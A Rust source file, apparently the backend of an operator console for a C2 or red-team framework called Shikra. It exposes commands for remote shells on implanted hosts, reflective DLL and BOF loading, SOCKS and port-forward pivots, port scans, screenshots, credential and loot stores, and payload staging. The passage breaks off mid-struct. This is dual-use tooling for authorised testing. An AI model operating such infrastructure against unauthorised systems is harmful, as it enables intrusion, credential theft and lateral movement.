//! Shikra Console — Tauri 2 backend.
//!
//! Thin command layer over `shikra-client`: session management, terminal,
//! file browser, BOF/WASM extensions, tunnels and the AI copilot panel.

mod ai;

use serde::Serialize;
use shikra_client::{ClientConfig, OperatorClient, TunnelManager};
use shikra_proto::v1::TaskResult;
use std::path::PathBuf;
use std::sync::Arc;
use tauri::{Manager, State};
use tokio::sync::Mutex;

struct AppState {
    client: Mutex<Option<OperatorClient>>,
    listeners: Mutex<Vec<tauri::async_runtime::JoinHandle<()>>>,
    connection: Mutex<Option<ConnectionInfo>>,
    server_process: Mutex<Option<tokio::process::Child>>,
    embedded_db: Mutex<Option<EmbeddedDb>>,
}

#[derive(Clone)]
struct ConnectionInfo {
    endpoint: String,
    ca_path: String,
}

struct EmbeddedDb {
    postgres: postgresql_embedded::PostgreSQL,
    database_url: String,
    port: u16,
}

/// `postgresql_embedded` always initializes the cluster with this superuser.
const BOOTSTRAP_DB_USER: &str = "postgres";

impl Default for AppState {
    fn default() -> Self {
        Self {
            client: Mutex::new(None),
            listeners: Mutex::new(Vec::new()),
            connection: Mutex::new(None),
            server_process: Mutex::new(None),
            embedded_db: Mutex::new(None),
        }
    }
}

#[derive(Serialize)]
struct SessionDto {
    id: String,
    kind: String,
    status: String,
    platform: String,
    architecture: String,
    hostname: String,
    username: String,
    process_name: String,
    remote_addr: String,
    last_seen_unix: i64,
    killdate_unix: u64,
    working_hours: String,
}

#[derive(Serialize)]
struct TaskDto {
    task_id: String,
    exit_code: i32,
    state: String,
    output: String,
}

fn to_session_dto(info: shikra_proto::v1::SessionInfo) -> SessionDto {
    use shikra_proto::v1::{Architecture, Platform, SessionKind, SessionStatus};
    let kind = match SessionKind::try_from(info.kind) {
        Ok(SessionKind::Beacon) => "beacon",
        Ok(SessionKind::External) => "external",
        _ => "session",
    };
    let status = match SessionStatus::try_from(info.status) {
        Ok(SessionStatus::Stale) => "stale",
        Ok(SessionStatus::Dead) => "dead",
        _ => "active",
    };
    let platform = match Platform::try_from(info.platform) {
        Ok(Platform::Windows) => "windows",
        Ok(Platform::Linux) => "linux",
        Ok(Platform::Macos) => "macos",
        _ => "unknown",
    };
    let architecture = match Architecture::try_from(info.architecture) {
        Ok(Architecture::X8664) => "x86_64",
        Ok(Architecture::Aarch64) => "aarch64",
        _ => "unknown",
    };
    SessionDto {
        id: info.id,
        kind: kind.into(),
        status: status.into(),
        platform: platform.into(),
        architecture: architecture.into(),
        hostname: info.hostname,
        username: info.username,
        process_name: info.process_name,
        remote_addr: info.remote_addr,
        last_seen_unix: info
            .last_seen
            .map(|timestamp| timestamp.seconds)
            .unwrap_or_default(),
        killdate_unix: info.killdate_unix,
        working_hours: info.working_hours,
    }
}

fn to_task_dto(result: TaskResult) -> TaskDto {
    use shikra_proto::v1::TaskState;
    let state = match TaskState::try_from(result.state) {
        Ok(TaskState::Completed) => "completed",
        Ok(TaskState::Failed) => "failed",
        Ok(TaskState::Cancelled) => "cancelled",
        Ok(TaskState::Running) => "running",
        Ok(TaskState::Dispatched) => "dispatched",
        _ => "pending",
    };
    TaskDto {
        task_id: result.task_id,
        exit_code: result.exit_code,
        state: state.into(),
        output: String::from_utf8_lossy(&result.output).to_string(),
    }
}

#[tauri::command]
async fn connect(
    state: State<'_, Arc<AppState>>,
    server: String,
    ca_path: String,
    token: String,
) -> Result<String, String> {
    let ca_pem = std::fs::read_to_string(&ca_path)
        .map_err(|err| format!("failed to read CA cert {ca_path}: {err}"))?;
    let config = ClientConfig {
        endpoint: server,
        ca_pem,
        token,
        domain: "localhost".into(),
    };
    let mut client = OperatorClient::connect(&config)
        .await
        .map_err(|err| err.to_string())?;
    let version = client.version().await.map_err(|err| err.to_string())?;
    *state.client.lock().await = Some(client);
    *state.connection.lock().await = Some(ConnectionInfo {
        endpoint: config.endpoint.clone(),
        ca_path,
    });
    Ok(version)
}

#[tauri::command]
async fn disconnect(state: State<'_, Arc<AppState>>) -> Result<(), String> {
    *state.client.lock().await = None;
    *state.connection.lock().await = None;
    let mut listeners = state.listeners.lock().await;
    for handle in listeners.drain(..) {
        handle.abort();
    }
    Ok(())
}

#[tauri::command]
async fn sessions(state: State<'_, Arc<AppState>>) -> Result<Vec<SessionDto>, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let sessions = client.sessions().await.map_err(|err| err.to_string())?;
    Ok(sessions.into_iter().map(to_session_dto).collect())
}

#[tauri::command]
async fn shell(
    state: State<'_, Arc<AppState>>,
    session_id: String,
    command: String,
) -> Result<TaskDto, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let result = client
        .run_task(
            &session_id,
            "shell",
            serde_json::json!({ "command": command }),
        )
        .await
        .map_err(|err| err.to_string())?;
    Ok(to_task_dto(result))
}

#[tauri::command]
async fn run_task(
    state: State<'_, Arc<AppState>>,
    session_id: String,
    kind: String,
    args: serde_json::Value,
) -> Result<TaskDto, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let result = client
        .run_task(&session_id, &kind, args)
        .await
        .map_err(|err| err.to_string())?;
    Ok(to_task_dto(result))
}

#[tauri::command]
async fn fs_ls(
    state: State<'_, Arc<AppState>>,
    session_id: String,
    path: String,
) -> Result<serde_json::Value, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let result = client
        .run_task(&session_id, "ls", serde_json::json!({ "path": path }))
        .await
        .map_err(|err| err.to_string())?;
    if result.exit_code != 0 {
        return Err(String::from_utf8_lossy(&result.output).to_string());
    }
    serde_json::from_slice(&result.output).map_err(|err| err.to_string())
}

#[tauri::command]
async fn fs_cat(
    state: State<'_, Arc<AppState>>,
    session_id: String,
    path: String,
) -> Result<TaskDto, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let result = client
        .run_task(&session_id, "cat", serde_json::json!({ "path": path }))
        .await
        .map_err(|err| err.to_string())?;
    Ok(to_task_dto(result))
}

#[tauri::command]
async fn fs_download(
    state: State<'_, Arc<AppState>>,
    session_id: String,
    remote: String,
    local: String,
) -> Result<u64, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    client
        .download_resumable(&session_id, &remote, &PathBuf::from(local), true)
        .await
        .map_err(|err| err.to_string())
}

#[tauri::command]
async fn fs_upload(
    state: State<'_, Arc<AppState>>,
    session_id: String,
    local: String,
    remote: String,
) -> Result<u64, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    client
        .upload(&session_id, &PathBuf::from(local), &remote)
        .await
        .map_err(|err| err.to_string())
}

#[tauri::command]
async fn bof_run(
    state: State<'_, Arc<AppState>>,
    session_id: String,
    file: String,
    args: String,
) -> Result<TaskDto, String> {
    let payload = std::fs::read(&file).map_err(|err| format!("failed to read {file}: {err}"))?;
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let results = client
        .submit_task(
            &session_id,
            "bof",
            serde_json::json!({ "args": args }),
            payload,
        )
        .await
        .map_err(|err| err.to_string())?;
    results
        .into_iter()
        .next()
        .map(to_task_dto)
        .ok_or_else(|| "no task result".to_string())
}

#[tauri::command]
async fn wasm_load(
    state: State<'_, Arc<AppState>>,
    session_id: String,
    name: String,
    file: String,
) -> Result<TaskDto, String> {
    let payload = std::fs::read(&file).map_err(|err| format!("failed to read {file}: {err}"))?;
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let results = client
        .submit_task(
            &session_id,
            "wasm_load",
            serde_json::json!({ "name": name }),
            payload,
        )
        .await
        .map_err(|err| err.to_string())?;
    results
        .into_iter()
        .next()
        .map(to_task_dto)
        .ok_or_else(|| "no task result".to_string())
}

#[tauri::command]
async fn wasm_run(
    state: State<'_, Arc<AppState>>,
    session_id: String,
    name: String,
    args: String,
) -> Result<TaskDto, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let result = client
        .run_task(
            &session_id,
            "wasm_run",
            serde_json::json!({ "name": name, "args": args }),
        )
        .await
        .map_err(|err| err.to_string())?;
    Ok(to_task_dto(result))
}

#[tauri::command]
async fn wasm_list(state: State<'_, Arc<AppState>>, session_id: String) -> Result<String, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let result = client
        .run_task(&session_id, "wasm_list", serde_json::Value::Null)
        .await
        .map_err(|err| err.to_string())?;
    Ok(String::from_utf8_lossy(&result.output).to_string())
}

#[tauri::command]
async fn rportfwd_start(
    state: State<'_, Arc<AppState>>,
    session_id: String,
    bind: String,
    to: String,
) -> Result<serde_json::Value, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let status = client
        .start_rportfwd(&session_id, &bind, &to)
        .await
        .map_err(|err| err.to_string())?;
    Ok(serde_json::json!({
        "forward_id": status.forward_id,
        "running": status.running,
        "message": status.message,
    }))
}

#[tauri::command]
async fn rportfwd_stop(
    state: State<'_, Arc<AppState>>,
    forward_id: String,
) -> Result<serde_json::Value, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let status = client
        .stop_rportfwd(&forward_id)
        .await
        .map_err(|err| err.to_string())?;
    Ok(serde_json::json!({
        "forward_id": status.forward_id,
        "running": status.running,
        "message": status.message,
    }))
}

#[tauri::command]
async fn socks_start(
    state: State<'_, Arc<AppState>>,
    session_id: String,
    listen: String,
) -> Result<String, String> {
    let manager: TunnelManager = {
        let guard = state.client.lock().await;
        let client = guard
            .as_ref()
            .ok_or_else(|| "not connected to a teamserver".to_string())?;
        client.tunnel_manager(&session_id)
    };
    let listener = tokio::net::TcpListener::bind(&listen)
        .await
        .map_err(|err| format!("failed to bind {listen}: {err}"))?;
    let manager = Arc::new(manager);
    let session = session_id.clone();
    let handle = tauri::async_runtime::spawn(async move {
        if let Err(err) = shikra_client::run_socks5(manager, session, listener).await {
            eprintln!("socks listener exited: {err}");
        }
    });
    state.listeners.lock().await.push(handle);
    Ok(format!("SOCKS5 proxy listening on {listen}"))
}

#[tauri::command]
async fn portfwd_start(
    state: State<'_, Arc<AppState>>,
    session_id: String,
    listen: String,
    target: String,
) -> Result<String, String> {
    let (host, port) = target
        .rsplit_once(':')
        .ok_or_else(|| format!("invalid target {target:?}, expected host:port"))?;
    let port: u16 = port
        .parse()
        .map_err(|_| format!("invalid port in {target:?}"))?;
    let manager: TunnelManager = {
        let guard = state.client.lock().await;
        let client = guard
            .as_ref()
            .ok_or_else(|| "not connected to a teamserver".to_string())?;
        client.tunnel_manager(&session_id)
    };
    let listener = tokio::net::TcpListener::bind(&listen)
        .await
        .map_err(|err| format!("failed to bind {listen}: {err}"))?;
    let manager = Arc::new(manager);
    let session = session_id.clone();
    let host = host.to_string();
    let handle = tauri::async_runtime::spawn(async move {
        if let Err(err) = shikra_client::run_portfwd(manager, session, listener, host, port).await {
            eprintln!("portfwd listener exited: {err}");
        }
    });
    state.listeners.lock().await.push(handle);
    Ok(format!("port forward listening on {listen} -> {target}"))
}

#[tauri::command]
async fn pivots(state: State<'_, Arc<AppState>>) -> Result<Vec<serde_json::Value>, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let forwards = client
        .list_rportfwds()
        .await
        .map_err(|err| err.to_string())?;
    Ok(forwards
        .into_iter()
        .map(|forward| {
            serde_json::json!({
                "forward_id": forward.forward_id,
                "session_id": forward.session_id,
                "transport": forward.transport,
                "bind": forward.bind,
                "to": forward.to,
                "connections": forward.connections,
            })
        })
        .collect())
}

#[tauri::command]
async fn portscan(
    state: State<'_, Arc<AppState>>,
    session_id: String,
    target: String,
    ports: String,
    timeout_ms: u64,
    banner: bool,
) -> Result<TaskDto, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let result = client
        .run_task(
            &session_id,
            "portscan",
            serde_json::json!({
                "target": target,
                "ports": ports,
                "timeout_ms": timeout_ms,
                "banner": banner,
            }),
        )
        .await
        .map_err(|err| err.to_string())?;
    Ok(to_task_dto(result))
}

#[tauri::command]
async fn screenshot(
    state: State<'_, Arc<AppState>>,
    session_id: String,
) -> Result<serde_json::Value, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let result = client
        .run_task(&session_id, "screenshot", serde_json::Value::Null)
        .await
        .map_err(|err| err.to_string())?;
    if result.exit_code != 0 {
        return Err(String::from_utf8_lossy(&result.output).to_string());
    }
    use base64::Engine;
    let mime = if result.output.starts_with(b"BM") {
        "image/bmp"
    } else if result.output.starts_with(b"\x89PNG") {
        "image/png"
    } else {
        "application/octet-stream"
    };
    let encoded = base64::engine::general_purpose::STANDARD.encode(&result.output);
    Ok(serde_json::json!({
        "size": result.output.len(),
        "mime": mime,
        "data_b64": encoded,
    }))
}

#[tauri::command]
async fn reflect_dll(
    state: State<'_, Arc<AppState>>,
    session_id: String,
    local_path: String,
) -> Result<TaskDto, String> {
    let bytes =
        std::fs::read(&local_path).map_err(|err| format!("failed to read {local_path}: {err}"))?;
    use base64::Engine;
    let payload = base64::engine::general_purpose::STANDARD.encode(bytes);
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let result = client
        .run_task(
            &session_id,
            "dll_reflect",
            serde_json::json!({ "payload": payload }),
        )
        .await
        .map_err(|err| err.to_string())?;
    Ok(to_task_dto(result))
}

#[tauri::command]
async fn native_load(
    state: State<'_, Arc<AppState>>,
    session_id: String,
    name: String,
    local_path: String,
) -> Result<TaskDto, String> {
    let bytes =
        std::fs::read(&local_path).map_err(|err| format!("failed to read {local_path}: {err}"))?;
    use base64::Engine;
    let payload = base64::engine::general_purpose::STANDARD.encode(bytes);
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let result = client
        .run_task(
            &session_id,
            "native_load",
            serde_json::json!({ "name": name, "payload": payload }),
        )
        .await
        .map_err(|err| err.to_string())?;
    Ok(to_task_dto(result))
}

#[tauri::command]
async fn native_run(
    state: State<'_, Arc<AppState>>,
    session_id: String,
    name: String,
    args: String,
) -> Result<TaskDto, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let result = client
        .run_task(
            &session_id,
            "native_run",
            serde_json::json!({ "name": name, "args": args }),
        )
        .await
        .map_err(|err| err.to_string())?;
    Ok(to_task_dto(result))
}

#[tauri::command]
async fn native_list(
    state: State<'_, Arc<AppState>>,
    session_id: String,
) -> Result<String, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let result = client
        .run_task(&session_id, "native_list", serde_json::Value::Null)
        .await
        .map_err(|err| err.to_string())?;
    Ok(String::from_utf8_lossy(&result.output).to_string())
}

#[tauri::command]
async fn extensions(state: State<'_, Arc<AppState>>) -> Result<Vec<serde_json::Value>, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let extensions = client
        .list_extensions()
        .await
        .map_err(|err| err.to_string())?;
    Ok(extensions
        .into_iter()
        .map(|extension| {
            serde_json::json!({
                "id": extension.id,
                "name": extension.name,
                "version": extension.version,
                "kind": extension.kind,
                "platform": extension.platform,
                "size": extension.size,
                "installed_by": extension.installed_by,
            })
        })
        .collect())
}

#[tauri::command]
async fn extension_push(
    state: State<'_, Arc<AppState>>,
    session_id: String,
    name: String,
    platform: String,
) -> Result<TaskDto, String> {
    let response = {
        let mut guard = state.client.lock().await;
        let client = guard
            .as_mut()
            .ok_or_else(|| "not connected to a teamserver".to_string())?;
        client
            .fetch_extension_by_name(&name, &platform)
            .await
            .map_err(|err| err.to_string())?
    };
    let info = response
        .info
        .ok_or_else(|| "registry returned no metadata".to_string())?;
    let task = if info.kind == "wasm" {
        "wasm_load"
    } else {
        "native_load"
    };
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let result = client
        .submit_task(
            &session_id,
            task,
            serde_json::json!({ "name": name }),
            response.payload,
        )
        .await
        .map_err(|err| err.to_string())?;
    match result.into_iter().next() {
        Some(result) => Ok(to_task_dto(result)),
        None => Err("teamserver returned no task result".into()),
    }
}

#[tauri::command]
async fn team_operators(state: State<'_, Arc<AppState>>) -> Result<Vec<serde_json::Value>, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let operators = client
        .list_operators()
        .await
        .map_err(|err| err.to_string())?;
    Ok(operators
        .into_iter()
        .map(|operator| {
            serde_json::json!({
                "id": operator.id,
                "name": operator.name,
                "role": operator.role,
                "disabled": operator.disabled,
            })
        })
        .collect())
}

#[tauri::command]
async fn team_operator_add(
    state: State<'_, Arc<AppState>>,
    name: String,
    role: String,
) -> Result<serde_json::Value, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let response = client
        .create_operator(&name, &role)
        .await
        .map_err(|err| err.to_string())?;
    Ok(serde_json::json!({
        "operator": response.operator.map(|op| serde_json::json!({
            "id": op.id,
            "name": op.name,
            "role": op.role,
        })),
        "token": response.token,
    }))
}

#[tauri::command]
async fn team_credentials(
    state: State<'_, Arc<AppState>>,
) -> Result<Vec<serde_json::Value>, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let credentials = client
        .list_credentials()
        .await
        .map_err(|err| err.to_string())?;
    Ok(credentials
        .into_iter()
        .map(|credential| {
            serde_json::json!({
                "id": credential.id,
                "host": credential.host,
                "username": credential.username,
                "secret": credential.secret,
                "kind": credential.kind,
            })
        })
        .collect())
}

#[tauri::command]
async fn team_credential_add(
    state: State<'_, Arc<AppState>>,
    host: String,
    username: String,
    secret: String,
    kind: String,
) -> Result<(), String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    client
        .add_credential(&host, &username, &secret, &kind)
        .await
        .map_err(|err| err.to_string())?;
    Ok(())
}

#[tauri::command]
async fn team_loot(state: State<'_, Arc<AppState>>) -> Result<Vec<serde_json::Value>, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let loot = client.list_loot().await.map_err(|err| err.to_string())?;
    Ok(loot
        .into_iter()
        .map(|item| {
            serde_json::json!({
                "id": item.id,
                "name": item.name,
                "kind": item.kind,
                "size": item.size,
                "sha256": item.sha256,
            })
        })
        .collect())
}

#[tauri::command]
async fn team_loot_add(
    state: State<'_, Arc<AppState>>,
    name: String,
    file: String,
    kind: String,
) -> Result<(), String> {
    let data = std::fs::read(&file).map_err(|err| format!("failed to read {file}: {err}"))?;
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    client
        .add_loot(&name, data, &kind)
        .await
        .map_err(|err| err.to_string())?;
    Ok(())
}

#[tauri::command]
async fn team_canaries(state: State<'_, Arc<AppState>>) -> Result<Vec<serde_json::Value>, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let canaries = client
        .list_canaries()
        .await
        .map_err(|err| err.to_string())?;
    Ok(canaries
        .into_iter()
        .map(|canary| {
            serde_json::json!({
                "id": canary.id,
                "token": canary.token,
                "kind": canary.kind,
                "note": canary.note,
                "triggered": canary.triggered,
            })
        })
        .collect())
}

#[tauri::command]
async fn team_canary_create(
    state: State<'_, Arc<AppState>>,
    kind: String,
    note: String,
) -> Result<String, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let canary = client
        .create_canary(&kind, &note)
        .await
        .map_err(|err| err.to_string())?;
    Ok(canary.token)
}

#[tauri::command]
async fn team_audit(state: State<'_, Arc<AppState>>) -> Result<serde_json::Value, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let status = client.verify_audit().await.map_err(|err| err.to_string())?;
    Ok(serde_json::json!({
        "valid": status.valid,
        "entries": status.entries,
        "message": status.message,
    }))
}

#[tauri::command]
async fn team_report(state: State<'_, Arc<AppState>>) -> Result<String, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    shikra_client::generate_report(client)
        .await
        .map_err(|err| err.to_string())
}

#[tauri::command]
async fn tasks_list(
    state: State<'_, Arc<AppState>>,
    session_id: String,
) -> Result<Vec<serde_json::Value>, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let tasks = client
        .list_tasks(Some(&session_id), 100)
        .await
        .map_err(|err| err.to_string())?;
    Ok(tasks
        .into_iter()
        .map(|task| {
            let state = match shikra_proto::v1::TaskState::try_from(task.state) {
                Ok(shikra_proto::v1::TaskState::Completed) => "completed",
                Ok(shikra_proto::v1::TaskState::Failed) => "failed",
                Ok(shikra_proto::v1::TaskState::Cancelled) => "cancelled",
                Ok(shikra_proto::v1::TaskState::Running) => "running",
                Ok(shikra_proto::v1::TaskState::Dispatched) => "dispatched",
                _ => "pending",
            };
            serde_json::json!({
                "id": task.id,
                "session_id": task.session_id,
                "command": task.command,
                "state": state,
                "exit_code": task.exit_code,
                "output": task.output,
                "created_at": task.created_at.map(|t| t.seconds).unwrap_or_default(),
                "completed_at": task.completed_at.map(|t| t.seconds).unwrap_or_default(),
            })
        })
        .collect())
}

#[tauri::command]
async fn task_cancel(
    state: State<'_, Arc<AppState>>,
    session_id: String,
    task_id: String,
) -> Result<String, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    client
        .cancel_task(&session_id, &task_id)
        .await
        .map_err(|err| err.to_string())?;
    Ok(format!("task {task_id} cancelled"))
}

#[tauri::command]
async fn chat_list(state: State<'_, Arc<AppState>>) -> Result<Vec<serde_json::Value>, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let messages = client.chat(200).await.map_err(|err| err.to_string())?;
    Ok(messages
        .into_iter()
        .map(|message| {
            serde_json::json!({
                "operator": message.operator,
                "message": message.message,
                "created_at": message.created_at.map(|t| t.seconds).unwrap_or_default(),
            })
        })
        .collect())
}

#[tauri::command]
async fn chat_send(state: State<'_, Arc<AppState>>, message: String) -> Result<(), String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    client
        .send_chat(&message)
        .await
        .map_err(|err| err.to_string())
}

#[tauri::command]
async fn events_list(state: State<'_, Arc<AppState>>) -> Result<Vec<serde_json::Value>, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let events = client.events(300).await.map_err(|err| err.to_string())?;
    Ok(events
        .into_iter()
        .map(|event| {
            serde_json::json!({
                "id": event.id,
                "kind": event.kind,
                "subject": event.subject,
                "payload": event.payload_json,
                "occurred_at": event.occurred_at.map(|t| t.seconds).unwrap_or_default(),
            })
        })
        .collect())
}

#[tauri::command]
async fn session_set_ui(
    state: State<'_, Arc<AppState>>,
    session_id: String,
    color: String,
    operator_status: String,
) -> Result<(), String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    client
        .set_session_ui(&session_id, &color, &operator_status)
        .await
        .map_err(|err| err.to_string())
}

#[tauri::command]
async fn webhook_get(state: State<'_, Arc<AppState>>) -> Result<String, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    client.webhook().await.map_err(|err| err.to_string())
}

#[tauri::command]
async fn webhook_set(state: State<'_, Arc<AppState>>, url: String) -> Result<String, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    client
        .set_webhook(&url)
        .await
        .map_err(|err| err.to_string())?;
    Ok(if url.trim().is_empty() {
        "webhook disabled".into()
    } else {
        "webhook saved".into()
    })
}

#[tauri::command]
fn read_text(path: String) -> Result<String, String> {
    std::fs::read_to_string(path.trim()).map_err(|err| format!("failed to read file: {err}"))
}

#[tauri::command]
fn write_text(path: String, contents: String) -> Result<String, String> {
    let path = PathBuf::from(path.trim());
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)
            .map_err(|err| format!("failed to create {}: {err}", parent.display()))?;
    }
    std::fs::write(&path, contents)
        .map_err(|err| format!("failed to write {}: {err}", path.display()))?;
    Ok(path.display().to_string())
}

#[tauri::command]
fn frontend_log(message: String) {
    eprintln!("[console] {message}");
}

#[tauri::command]
async fn listeners(state: State<'_, Arc<AppState>>) -> Result<Vec<serde_json::Value>, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let listeners = client.listeners().await.map_err(|err| err.to_string())?;
    Ok(listeners
        .into_iter()
        .map(|listener| {
            serde_json::json!({
                "id": listener.id,
                "kind": listener.kind,
                "addr": listener.addr,
                "running": listener.running,
                "detail": listener.detail,
            })
        })
        .collect())
}

#[tauri::command]
async fn listener_start(
    state: State<'_, Arc<AppState>>,
    kind: String,
    addr: String,
    dns_zone: String,
) -> Result<serde_json::Value, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let listener = client
        .start_listener(&kind, &addr, &dns_zone)
        .await
        .map_err(|err| err.to_string())?;
    Ok(serde_json::json!({
        "id": listener.id,
        "kind": listener.kind,
        "addr": listener.addr,
        "detail": listener.detail,
    }))
}

#[tauri::command]
async fn listener_stop(state: State<'_, Arc<AppState>>, id: String) -> Result<String, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    client
        .stop_listener(&id)
        .await
        .map_err(|err| err.to_string())?;
    Ok(format!("listener {id} stopped"))
}

#[tauri::command]
async fn pick_free_port(host: String, from_port: u16) -> Result<u16, String> {
    if host.trim().is_empty() {
        return Err("host is required".into());
    }
    for port in from_port..from_port.saturating_add(200) {
        if tokio::net::TcpListener::bind((host.trim(), port))
            .await
            .is_ok()
        {
            return Ok(port);
        }
    }
    Err("no free port found nearby".into())
}

/// Copies a staged payload into the teamserver hosting directory served by
/// `/cdn/{file}`.
#[tauri::command]
fn publish_stage(
    source_path: String,
    dest_dir: String,
    file_name: String,
) -> Result<String, String> {
    let source = PathBuf::from(source_path.trim());
    if !source.is_file() {
        return Err(format!("stage not found: {}", source.display()));
    }
    let name = std::path::Path::new(file_name.trim())
        .file_name()
        .and_then(|name| name.to_str())
        .filter(|name| {
            !name.is_empty()
                && name.len() <= 128
                && !name.starts_with('.')
                && name
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_'))
        })
        .ok_or_else(|| format!("invalid stage file name {file_name:?}"))?;
    let dest_dir = PathBuf::from(dest_dir.trim());
    std::fs::create_dir_all(&dest_dir)
        .map_err(|err| format!("failed to create {}: {err}", dest_dir.display()))?;
    let dest = dest_dir.join(name);
    std::fs::copy(&source, &dest)
        .map_err(|err| format!("failed to copy stage to {}: {err}", dest.display()))?;
    Ok(dest.display().to_string())
}

/// Looks next to a CA certificate for the sibling enrollment material the
/// builder needs, so the console can auto-fill the paths.
#[tauri::command]
fn material_siblings(ca_path: String) -> Result<serde_json::Value, String> {
    let trimmed = ca_path.trim();
    if trimmed.is_empty() {
        return Ok(serde_json::json!({}));
    }
    let Some(dir) = std::path::Path::new(trimmed).parent() else {
        return Ok(serde_json::json!({}));
    };
    let mut result = serde_json::Map::new();
    for (file, key) in [
        ("enroll.token", "enrollTokenFile"),
        ("server-identity.pub", "serverIdentityFile"),
    ] {
        let candidate = dir.join(file);
        if candidate.exists() {
            result.insert(
                key.to_string(),
                serde_json::Value::String(candidate.display().to_string()),
            );
        }
    }
    Ok(serde_json::Value::Object(result))
}

#[tauri::command]
async fn connection_info(state: State<'_, Arc<AppState>>) -> Result<serde_json::Value, String> {
    let guard = state.connection.lock().await;
    match guard.as_ref() {
        Some(info) => Ok(serde_json::json!({
            "endpoint": info.endpoint,
            "ca_path": info.ca_path,
        })),
        None => Ok(serde_json::json!(null)),
    }
}

#[derive(serde::Deserialize)]
#[serde(rename_all = "camelCase")]
struct BuildOptions {
